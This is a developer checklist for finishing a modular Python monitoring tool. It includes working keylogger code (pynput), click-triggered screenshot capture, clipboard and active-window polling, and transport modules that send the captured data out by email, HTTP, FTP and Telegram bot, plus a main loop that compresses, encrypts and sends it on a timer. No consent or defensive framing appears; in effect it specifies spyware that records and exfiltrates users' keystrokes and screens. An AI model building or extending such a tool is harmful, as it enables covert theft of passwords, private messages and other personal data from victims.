# Implementation Checklist

Use this to track your progress implementing the remaining modules.
Each item includes the file to create, the class to implement, and
a mini-spec of what each method should do.

---

## Capture Modules

All capture modules go in `capture/` and must:
1. Inherit from `capture.base.BaseCapture`
2. Use the `@register_capture("name")` decorator from `capture/__init__.py`
3. Implement `start()`, `stop()`, and `collect()`

### - [ ] Keyboard Capture (`capture/keyboard_capture.py`)

**Class:** `KeyboardCapture(BaseCapture)`
**Decorator:** `@register_capture("keyboard")`
**Library:** `pynput.keyboard.Listener`

| Method | What to implement |
|--------|-------------------|
| `start()` | Create a `pynput.keyboard.Listener(on_press=..., on_release=...)` and start it in a daemon thread. Set `self._running = True`. |
| `stop()` | Call `listener.stop()` and `listener.join()`. Set `self._running = False`. |
| `collect()` | Return buffered keystrokes as a list of dicts and clear the buffer. Each dict: `{"type": "keystroke", "data": "<key>", "timestamp": <float>}` |

**Key details:**
- Buffer keystrokes in a `list` protected by `threading.Lock`
- Handle special keys (shift, ctrl, enter, backspace) — convert to readable strings
- Use `pynput.keyboard.Key` enum for special keys, `.char` attribute for normal keys
- Catch `AttributeError` when `.char` is `None` (some keys don't have a char)

**Skeleton:**
```python
from capture import register_capture
from capture.base import BaseCapture
from pynput.keyboard import Listener, Key
import threading
import time

@register_capture("keyboard")
class KeyboardCapture(BaseCapture):
    def __init__(self, config):
        super().__init__(config)
        self._buffer = []
        self._lock = threading.Lock()
        self._listener = None

    def _on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            char = f"[{key.name}]"
        with self._lock:
            self._buffer.append({
                "type": "keystroke",
                "data": char,
                "timestamp": time.time(),
            })

    def start(self):
        self._listener = Listener(on_press=self._on_press)
        self._listener.daemon = True
        self._listener.start()
        self._running = True
        self.logger.info("Keyboard capture started")

    def stop(self):
        if self._listener:
            self._listener.stop()
            self._listener.join(timeout=2)
        self._running = False
        self.logger.info("Keyboard capture stopped")

    def collect(self):
        with self._lock:
            data = self._buffer.copy()
            self._buffer.clear()
        return data
```

---

### - [ ] Mouse Capture (`capture/mouse_capture.py`)

**Class:** `MouseCapture(BaseCapture)`
**Decorator:** `@register_capture("mouse")`
**Library:** `pynput.mouse.Listener`

| Method | What to implement |
|--------|-------------------|
| `start()` | Create a `pynput.mouse.Listener(on_click=..., on_move=...)` and start it as daemon thread. |
| `stop()` | Stop and join the listener. |
| `collect()` | Return buffered mouse events and clear buffer. Each dict: `{"type": "mouse_click", "data": {"x": int, "y": int, "button": str, "pressed": bool}, "timestamp": float}` |

**Key details:**
- Only log clicks by default (logging every move would be too noisy)
- Make move tracking configurable via `config.get("track_movement", False)`
- Use `button.name` to get button string ("left", "right", "middle")

---

### - [ ] Screenshot Capture (`capture/screenshot_capture.py`)

**Class:** `ScreenshotCapture(BaseCapture)`
**Decorator:** `@register_capture("screenshot")`
**Library:** `PIL.ImageGrab` (from Pillow)

| Method | What to implement |
|--------|-------------------|
| `start()` | Create the screenshot directory. Set `self._running = True`. |
| `stop()` | Set `self._running = False`. |
| `take_screenshot()` | Grab screen, save to data dir, append to buffer. Return filepath. |
| `collect()` | Return buffered screenshot records and clear buffer. Each dict: `{"type": "screenshot", "path": str, "timestamp": float, "size": int}` |

**Key details:**
- Use `PIL.ImageGrab.grab()` for cross-platform capture
- Save format and quality from config (`config.get("format", "png")`, `config.get("quality", 80)`)
- Enforce `max_count` from config — stop capturing when limit reached
- Use `pathlib.Path` for all paths
- Use `threading.Lock` to protect the buffer
- Zero-pad filenames: `screenshot_0001.png`
- This module captures on-demand (called by mouse/keyboard triggers), NOT on a timer

**Integration note:** The mouse capture module should call `screenshot_capture.take_screenshot()` on click events. Wire this in `main.py`.

---

### - [ ] Clipboard Capture (`capture/clipboard_capture.py`)

**Class:** `ClipboardCapture(BaseCapture)`
**Decorator:** `@register_capture("clipboard")`
**Library:** `pyperclip`

| Method | What to implement |
|--------|-------------------|
| `start()` | Start a polling thread that checks clipboard every N seconds. |
| `stop()` | Signal the polling thread to stop and join it. |
| `collect()` | Return buffered clipboard changes and clear buffer. Each dict: `{"type": "clipboard", "data": str, "timestamp": float}` |

**Key details:**
- Poll interval from config: `config.get("poll_interval", 5)`
- Only record when clipboard **changes** (compare with `self._last_content`)
- Use `threading.Event` for clean shutdown: `self._stop_event.wait(interval)`
- Handle `pyperclip.PyperclipException` for headless environments
- Truncate very large clipboard contents (e.g., max 10KB)

---

### - [ ] Window Capture (`capture/window_capture.py`)

**Class:** `WindowCapture(BaseCapture)`
**Decorator:** `@register_capture("window")`
**Library:** Platform-specific (see below)

| Method | What to implement |
|--------|-------------------|
| `start()` | Start a polling thread that checks active window every N seconds. |
| `stop()` | Signal the polling thread to stop and join it. |
| `collect()` | Return buffered window changes and clear buffer. Each dict: `{"type": "window", "data": str, "timestamp": float}` |

**Platform-specific window title detection:**

```python
import platform

def _get_active_window_title() -> str:
    system = platform.system().lower()
    try:
        if system == "linux":
            import subprocess
            result = subprocess.run(
                ["xdotool", "getactivewindow", "getwindowname"],
                capture_output=True, text=True, timeout=2,
            )
            return result.stdout.strip()
        elif system == "windows":
            import ctypes
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        elif system == "darwin":
            import subprocess
            script = 'tell application "System Events" to get name of first application process whose frontmost is true'
            result = subprocess.run(
                ["osascript", "-e", script],
                capture_output=True, text=True, timeout=2,
            )
            return result.stdout.strip()
    except Exception:
        return "Unknown"
    return "Unknown"
```

**Key details:**
- Poll interval from config: `config.get("poll_interval", 2)`
- Only record when window **changes** (compare with `self._last_window`)
- Requires `xdotool` on Linux — fail gracefully if not installed

---

## Transport Modules

All transport modules go in `transport/` and must:
1. Inherit from `transport.base.BaseTransport`
2. Use the `@register_transport("name")` decorator from `transport/__init__.py`
3. Implement `connect()`, `send()`, and `disconnect()`

### - [ ] Email Transport (`transport/email_transport.py`)

**Class:** `EmailTransport(BaseTransport)`
**Decorator:** `@register_transport("email")`
**Library:** `smtplib`, `email.message.EmailMessage`

| Method | What to implement |
|--------|-------------------|
| `connect()` | Create `smtplib.SMTP_SSL` connection and login. Store in `self._smtp`. Set `self._connected = True`. |
| `send(data, metadata)` | Build `EmailMessage`, attach data as file, send via `self._smtp`. Return `True`/`False`. |
| `disconnect()` | Call `self._smtp.quit()`. Set `self._connected = False`. |

**Config keys:** `smtp_server`, `smtp_port`, `use_ssl`, `sender`, `password`, `recipient`

**Key details:**
- Use `email.message.EmailMessage` (not legacy `MIMEMultipart`)
- Set subject from metadata: `metadata.get("subject", "Report")`
- Attach data with `msg.add_attachment(data, maintype="application", subtype="octet-stream", filename=...)`
- Wrap operations in try/except — return `False` on failure, don't crash
- Use the `@retry` decorator from `utils/resilience.py` on `send()`

---

### - [ ] HTTP Transport (`transport/http_transport.py`)

**Class:** `HTTPTransport(BaseTransport)`
**Decorator:** `@register_transport("http")`
**Library:** `requests`

| Method | What to implement |
|--------|-------------------|
| `connect()` | Create `requests.Session()` and set headers. Set `self._connected = True`. |
| `send(data, metadata)` | POST/PUT data to configured URL. Return `True` if status 2xx. |
| `disconnect()` | Close session. Set `self._connected = False`. |

**Config keys:** `url`, `method` (POST/PUT), `headers` (dict)

**Key details:**
- Use `requests.Session()` for connection pooling
- Send data as file upload: `session.post(url, files={"data": data})`
- Or send as raw body: `session.post(url, data=data, headers=...)`
- Check `response.status_code` — return `True` for 2xx, `False` otherwise
- Set timeout: `timeout=30`

---

### - [ ] FTP Transport (`transport/ftp_transport.py`)

**Class:** `FTPTransport(BaseTransport)`
**Decorator:** `@register_transport("ftp")`
**Library:** `ftplib.FTP` / `ftplib.FTP_TLS`

| Method | What to implement |
|--------|-------------------|
| `connect()` | Create FTP connection, login, `cwd` to remote_dir. |
| `send(data, metadata)` | Upload data via `storbinary()`. Return `True`/`False`. |
| `disconnect()` | Call `ftp.quit()`. |

**Config keys:** `host`, `port`, `username`, `password`, `remote_dir`

**Key details:**
- Use `io.BytesIO(data)` to wrap bytes for `storbinary()`
- Generate filename from metadata or timestamp: `f"report_{int(time.time())}.bin"`
- Use `FTP_TLS` if `config.get("use_tls", False)`

---

### - [ ] Telegram Transport (`transport/telegram_transport.py`)

**Class:** `TelegramTransport(BaseTransport)`
**Decorator:** `@register_transport("telegram")`
**Library:** `requests`

| Method | What to implement |
|--------|-------------------|
| `connect()` | Verify bot token by calling `getMe` API. Set connected. |
| `send(data, metadata)` | Send data as document via `sendDocument` API. Return `True`/`False`. |
| `disconnect()` | No-op (stateless HTTP). Set `self._connected = False`. |

**Config keys:** `bot_token`, `chat_id`

**API endpoints:**
- Verify: `GET https://api.telegram.org/bot<token>/getMe`
- Send doc: `POST https://api.telegram.org/bot<token>/sendDocument`
  - Form data: `chat_id=<id>`, `document=<file bytes>`

**Key details:**
- Use `requests.post(url, data={"chat_id": chat_id}, files={"document": ("report.zip", data)})`
- Check `response.json()["ok"]` for success
- Telegram file size limit: 50MB

---

## Main Loop (`main.py`)

### - [ ] Implement the collect/send/rotate cycle

Replace lines 162-175 in `main.py` with the actual loop:

```python
# After starting captures, create storage and transport:
from storage import StorageManager, SQLiteStorage
from utils.compression import zip_files
from utils.crypto import encrypt, key_from_base64

storage_mgr = StorageManager(
    data_dir=settings.get("general.data_dir", "./data"),
    max_size_mb=settings.get("storage.max_size_mb", 500),
    rotation=settings.get("storage.rotation", True),
)
db = SQLiteStorage(settings.get("storage.sqlite_path", "./data/captures.db"))

# Main loop
last_report_time = time.time()

try:
    while not shutdown.requested:
        time.sleep(1.0)

        elapsed = time.time() - last_report_time
        if elapsed < report_interval:
            continue

        # --- Collect from all captures ---
        all_data = []
        for cap in captures:
            try:
                items = cap.collect()
                all_data.extend(items)
            except Exception as e:
                logger.error("Collect failed for %s: %s", cap, e)

        if not all_data and not args.dry_run:
            last_report_time = time.time()
            continue

        logger.info("Collected %d items from %d captures", len(all_data), len(captures))

        # --- Store in SQLite ---
        for item in all_data:
            db.insert(
                capture_type=item.get("type", "unknown"),
                data=item.get("data", ""),
                file_path=item.get("path", ""),
                file_size=item.get("size", 0),
            )

        # --- Compress ---
        # Gather file paths from screenshot-type captures
        file_paths = [item["path"] for item in all_data if "path" in item]
        if file_paths:
            compressed = zip_files(file_paths)
        else:
            import json
            compressed = json.dumps(all_data, default=str).encode()

        # --- Encrypt (if enabled) ---
        if settings.get("encryption.enabled", False):
            key_b64 = settings.get("encryption.key", "")
            if key_b64:
                key = key_from_base64(key_b64)
                compressed = encrypt(compressed, key)

        # --- Send via transport (if not dry run) ---
        if not args.dry_run:
            # TODO: Create transport via create_transport(config)
            # and call transport.connect(), transport.send(), transport.disconnect()
            pass

        # --- Clean up sent files ---
        if file_paths and not args.dry_run:
            storage_mgr.cleanup(file_paths)

        last_report_time = time.time()

except KeyboardInterrupt:
    logger.info("KeyboardInterrupt received")
```

---

## Integration Tests

### - [ ] Create `tests/test_integration.py`

Test the full pipeline end-to-end:
1. Create mock captures that return fake data
2. Verify data flows through storage, compression, encryption
3. Verify transport receives the correct data
4. Verify cleanup happens after successful send

---

## Final Checklist

### - [ ] Import all capture modules in `main.py`

After creating capture modules, add imports to `main.py` so they register:

```python
# main.py — add before main()
import capture.keyboard_capture    # registers "keyboard"
import capture.mouse_capture       # registers "mouse"
import capture.screenshot_capture  # registers "screenshot"
import capture.clipboard_capture   # registers "clipboard"
import capture.window_capture      # registers "window"

import transport.email_transport   # registers "email"
import transport.http_transport    # registers "http"
import transport.ftp_transport     # registers "ftp"
import transport.telegram_transport  # registers "telegram"
```

### - [ ] Run full test suite

```bash
python -m pytest tests/ -v --cov=. --cov-report=term-missing
```

### - [ ] Test each capture manually

```bash
python main.py --config config/default_config.yaml --log-level DEBUG
```

### - [ ] Verify `python main.py --list-captures` shows all modules

### - [ ] Verify `python main.py --list-transports` shows all modules
